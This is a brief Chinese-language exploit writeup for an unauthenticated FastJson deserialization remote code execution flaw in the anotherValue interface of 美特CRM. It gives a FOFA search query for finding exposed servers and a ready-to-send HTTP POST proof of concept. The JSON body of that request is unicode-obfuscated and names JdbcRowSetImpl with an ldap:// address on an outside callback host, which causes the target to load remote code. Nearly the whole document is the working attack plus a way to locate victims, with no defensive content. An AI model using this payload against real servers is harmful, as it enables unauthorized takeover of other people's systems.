# 美特CRM系统接口anotherValue存在FastJson反序列化RCE

美特CRM anotherValue接口处使用存在漏洞 fastjson 组件，未经身份验证的远程攻击者可通过fastjson 序列化漏洞对美特CRM发起攻击，执行任意代码并可获取服务器权限。

## fofa

```
body="/common/scripts/basic.js"
```

## poc

```
POST /eai/someValue/anotherValue HTTP/1.1
Host: ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Content-Length: 373
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: no-cache
Connection: close
Content-Type: application/json
Cookie: JSESSIONID=E010A1A6DED8C9644CFAB420D41F4EB7
Pragma: no-cache
Upgrade-Insecure-Requests: 1

{"b":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c","\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065":"ldap://fpwnnkhmfn.dgrh3.cn","autoCommit":true}}
```

